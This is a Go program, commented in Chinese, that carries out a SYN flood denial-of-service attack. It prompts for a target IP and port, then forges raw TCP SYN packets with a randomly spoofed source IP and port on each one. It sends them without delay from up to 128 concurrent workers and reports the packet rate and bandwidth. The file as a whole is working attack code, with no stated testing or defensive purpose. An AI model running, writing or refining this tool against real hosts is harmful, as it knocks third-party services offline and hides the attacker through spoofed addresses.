package main

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// ifaceInfo 统一保存选中网卡的所有信息
type ifaceInfo struct {
	Name string           // 网卡/设备名
	IP   net.IP           // 网卡 IPv4
	MAC  net.HardwareAddr // 网卡 MAC
	Mask net.IPMask       // 子网掩码
}

// packetSender 平台特定的发包接口
type packetSender interface {
	Send(data []byte) error
	Close() error
}

// newPacketSender 平台特定实现，在各平台文件中定义
// func newPacketSender(deviceName string) (packetSender, error)

func generateRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

// selectInterface 根据目标 IP 选择最合适的网卡（纯 Go，不依赖 pcap）
func selectInterface(targetIP net.IP) (*ifaceInfo, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}

	var fallback *ifaceInfo

	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 || len(iface.HardwareAddr) == 0 {
			continue
		}

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			ipNet, ok := addr.(*net.IPNet)
			if !ok || ipNet.IP.IsLoopback() || ipNet.IP.To4() == nil {
				continue
			}

			ip := ipNet.IP.To4()
			info := &ifaceInfo{
				Name: iface.Name,
				IP:   ip,
				MAC:  iface.HardwareAddr,
				Mask: ipNet.Mask,
			}

			// 与目标同子网 → 优先选择
			if ip.Mask(ipNet.Mask).Equal(targetIP.Mask(ipNet.Mask)) {
				return info, nil
			}

			if fallback == nil {
				fallback = info
			}
		}
	}

	if fallback != nil {
		return fallback, nil
	}
	return nil, fmt.Errorf("no suitable network interface found")
}

// listAvailableInterfaces 列出所有可用的网络接口
func listAvailableInterfaces() ([]*ifaceInfo, error) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, err
	}

	var result []*ifaceInfo
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 || len(iface.HardwareAddr) == 0 {
			continue
		}

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			ipNet, ok := addr.(*net.IPNet)
			if !ok || ipNet.IP.IsLoopback() || ipNet.IP.To4() == nil {
				continue
			}

			result = append(result, &ifaceInfo{
				Name: iface.Name,
				IP:   ipNet.IP.To4(),
				MAC:  iface.HardwareAddr,
				Mask: ipNet.Mask,
			})
		}
	}
	return result, nil
}

// selectInterfaceInteractive 交互式选择网卡，返回 nil 表示使用自动选择
func selectInterfaceInteractive() *ifaceInfo {
	ifaces, err := listAvailableInterfaces()
	if err != nil || len(ifaces) == 0 {
		fmt.Println("[警告] 无法列出可用网卡，将使用自动选择")
		return nil
	}

	fmt.Println("\n可用网卡列表:")
	fmt.Println("--------------------------------------------------------------")
	fmt.Printf("  %-4s %-24s %-16s %s\n", "序号", "网卡名", "IPv4", "MAC")
	fmt.Println("--------------------------------------------------------------")
	for i, iface := range ifaces {
		fmt.Printf("  %-4d %-24s %-16s %s\n", i+1, iface.Name, iface.IP, iface.MAC)
	}
	fmt.Println("--------------------------------------------------------------")
	fmt.Print("请选择网卡序号 (直接回车使用自动选择): ")

	var input string
	fmt.Scanln(&input)
	input = strings.TrimSpace(input)
	if input == "" {
		return nil
	}

	var idx int
	if _, err := fmt.Sscanf(input, "%d", &idx); err != nil || idx < 1 || idx > len(ifaces) {
		fmt.Println("[警告] 无效选择，将使用自动选择")
		return nil
	}

	selected := ifaces[idx-1]
	fmt.Printf("[信息] 已选择网卡: %s (%s)\n", selected.Name, selected.IP)
	return selected
}

// getDefaultGateway 获取默认网关 IP
func getDefaultGateway() (string, error) {
	if runtime.GOOS == "windows" {
		out, err := exec.Command("cmd", "/c", "netstat", "-rn").Output()
		if err != nil {
			return "", err
		}
		for _, line := range strings.Split(string(out), "\n") {
			fields := strings.Fields(line)
			if len(fields) >= 3 && fields[0] == "0.0.0.0" && fields[1] == "0.0.0.0" {
				return fields[2], nil
			}
		}
	} else {
		out, err := exec.Command("ip", "route").Output()
		if err != nil {
			return "", err
		}
		for _, line := range strings.Split(string(out), "\n") {
			if strings.HasPrefix(line, "default") {
				fields := strings.Fields(line)
				for i, f := range fields {
					if f == "via" && i+1 < len(fields) {
						return fields[i+1], nil
					}
				}
			}
		}
	}
	return "", fmt.Errorf("default gateway not found")
}

// resolveMACByARP 通过系统 ARP 表解析 IP 对应的 MAC 地址
func resolveMACByARP(ip string) (net.HardwareAddr, error) {
	pingArgs := []string{"-n", "1", "-w", "1000", ip}
	if runtime.GOOS != "windows" {
		pingArgs = []string{"-c", "1", "-W", "1", ip}
	}
	exec.Command("ping", pingArgs...).Run()
	time.Sleep(500 * time.Millisecond)

	var out []byte
	var err error
	if runtime.GOOS == "windows" {
		out, err = exec.Command("arp", "-a", ip).Output()
	} else {
		out, err = exec.Command("arp", "-n", ip).Output()
	}
	if err != nil {
		return nil, err
	}

	re := regexp.MustCompile(`([0-9a-fA-F]{2}[-:]){5}[0-9a-fA-F]{2}`)
	match := re.FindString(string(out))
	if match == "" {
		return nil, fmt.Errorf("MAC not found in ARP table for %s", ip)
	}

	match = strings.ReplaceAll(match, "-", ":")
	return net.ParseMAC(match)
}

// buildSynPacket 构造 SYN 包（纯 gopacket/layers，不需要 cgo）
func buildSynPacket(srcMAC, dstMAC net.HardwareAddr, sourceIP string, sourcePort uint16, targetIP net.IP, targetPort uint16) ([]byte, error) {
	ethLayer := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}

	ipLayer := layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      64,
		Protocol: layers.IPProtocolTCP,
		SrcIP:    net.ParseIP(sourceIP),
		DstIP:    targetIP,
	}

	tcpLayer := layers.TCP{
		SrcPort:    layers.TCPPort(sourcePort),
		DstPort:    layers.TCPPort(targetPort),
		Seq:        rand.Uint32(),
		DataOffset: 5,
		Window:     5840,
		SYN:        true,
	}
	tcpLayer.SetNetworkLayerForChecksum(&ipLayer)

	buffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	err := gopacket.SerializeLayers(buffer, options, &ethLayer, &ipLayer, &tcpLayer)
	if err != nil {
		return nil, err
	}
	return buffer.Bytes(), nil
}

func sendSynPackets(targetIP string, targetPort uint16, workerCount int, userIface *ifaceInfo) {
	parsedTargetIP := net.ParseIP(targetIP)

	// ===== 统一选择网卡 =====
	var iface *ifaceInfo
	var err error
	if userIface != nil {
		iface = userIface
		fmt.Printf("[信息] 使用指定网卡: %s\n", iface.Name)
	} else {
		iface, err = selectInterface(parsedTargetIP)
		if err != nil {
			log.Fatal("Failed to select interface: ", err)
		}
	}
	fmt.Printf("[信息] 网卡:   %s\n", iface.Name)
	fmt.Printf("[信息] 本机 IP:  %s\n", iface.IP)
	fmt.Printf("[信息] 本机 MAC: %s\n", iface.MAC)
	fmt.Printf("[信息] 子网掩码: %s\n", iface.Mask)

	// ===== 确定目的 MAC =====
	var dstMAC net.HardwareAddr
	if iface.Mask != nil && iface.IP.Mask(iface.Mask).Equal(parsedTargetIP.Mask(iface.Mask)) {
		fmt.Printf("[信息] 目标 %s 在同一子网，ARP 解析目标 MAC...\n", targetIP)
		dstMAC, err = resolveMACByARP(targetIP)
		if err != nil {
			log.Fatal("Failed to resolve target MAC: ", err)
		}
	} else {
		gateway, gwErr := getDefaultGateway()
		if gwErr != nil {
			log.Fatal("Failed to get default gateway: ", gwErr)
		}
		fmt.Printf("[信息] 目标 %s 不在同一子网，通过网关 %s 转发...\n", targetIP, gateway)
		dstMAC, err = resolveMACByARP(gateway)
		if err != nil {
			log.Fatal("Failed to resolve gateway MAC: ", err)
		}
	}
	fmt.Printf("[信息] 目的 MAC: %s\n", dstMAC)

	// ===== 初始化发包器（每个 worker 一个独立 handle）=====
	senders := make([]packetSender, workerCount)
	for i := 0; i < workerCount; i++ {
		ps, psErr := newPacketSender(iface.Name)
		if psErr != nil {
			log.Fatalf("Failed to init packet sender #%d: %v", i, psErr)
		}
		senders[i] = ps
	}
	defer func() {
		for _, ps := range senders {
			ps.Close()
		}
	}()

	// ===== 监听 Ctrl+C =====
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	var sentCount uint64
	var errCount uint64
	stopFlag := int32(0)

	// ===== 实时统计 goroutine =====
	go func() {
		var lastCount uint64
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			if atomic.LoadInt32(&stopFlag) != 0 {
				return
			}
			cur := atomic.LoadUint64(&sentCount)
			pps := cur - lastCount
			// 每包 54 字节（14 Eth + 20 IP + 20 TCP）
			bandwidth := float64(pps*54) / 1024.0 / 1024.0 * 8 // Mbps
			fmt.Printf("\r[统计] 总计: %d 包 | 速率: %d pps | 带宽: %.3f Mbps | 错误: %d    ",
				cur, pps, bandwidth, atomic.LoadUint64(&errCount))
			lastCount = cur
		}
	}()

	fmt.Printf("\n启动 %d 个并发 worker，无延迟发包，按 Ctrl+C 停止...\n\n", workerCount)

	// ===== 启动 worker goroutines =====
	var wg sync.WaitGroup
	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			// 每个 goroutine 独立随机源，避免锁竞争
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
			buf := gopacket.NewSerializeBuffer()
			options := gopacket.SerializeOptions{
				FixLengths:       true,
				ComputeChecksums: true,
			}
			ps := senders[workerID]

			for atomic.LoadInt32(&stopFlag) == 0 {
				srcIP := fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
				srcPort := uint16(rng.Intn(65535))

				ethLayer := layers.Ethernet{
					SrcMAC:       iface.MAC,
					DstMAC:       dstMAC,
					EthernetType: layers.EthernetTypeIPv4,
				}
				ipLayer := layers.IPv4{
					Version:  4,
					IHL:      5,
					TTL:      64,
					Protocol: layers.IPProtocolTCP,
					SrcIP:    net.ParseIP(srcIP),
					DstIP:    parsedTargetIP,
				}
				tcpLayer := layers.TCP{
					SrcPort:    layers.TCPPort(srcPort),
					DstPort:    layers.TCPPort(targetPort),
					Seq:        rng.Uint32(),
					DataOffset: 5,
					Window:     5840,
					SYN:        true,
				}
				tcpLayer.SetNetworkLayerForChecksum(&ipLayer)

				buf.Clear()
				if serErr := gopacket.SerializeLayers(buf, options, &ethLayer, &ipLayer, &tcpLayer); serErr != nil {
					atomic.AddUint64(&errCount, 1)
					continue
				}

				if sendErr := ps.Send(buf.Bytes()); sendErr != nil {
					atomic.AddUint64(&errCount, 1)
					continue
				}
				atomic.AddUint64(&sentCount, 1)
			}
		}(i)
	}

	// 等待停止信号
	<-sigChan
	atomic.StoreInt32(&stopFlag, 1)
	wg.Wait()

	total := atomic.LoadUint64(&sentCount)
	totalErr := atomic.LoadUint64(&errCount)
	fmt.Printf("\n\n已停止，共发送 %d 个 SYN 包，错误 %d 次\n", total, totalErr)
}

func main() {
	var targetIP string
	var targetPort int
	var workerCount int

	fmt.Print("请输入目标 IP: ")
	fmt.Scanln(&targetIP)
	if targetIP == "" {
		log.Fatal("目标 IP 不能为空")
	}

	fmt.Print("请输入目标端口: ")
	fmt.Scanln(&targetPort)
	if targetPort <= 0 || targetPort > 65535 {
		log.Fatal("端口范围: 1-65535")
	}

	fmt.Print("请输入并发 worker 数量 (建议 1-32): ")
	fmt.Scanln(&workerCount)
	if workerCount <= 0 {
		workerCount = 1
	}
	if workerCount > 128 {
		fmt.Println("[警告] worker 数量过大，已限制为 128")
		workerCount = 128
	}

	// 交互式选择网卡
	selectedIface := selectInterfaceInteractive()

	sendSynPackets(targetIP, uint16(targetPort), workerCount, selectedIface)
}
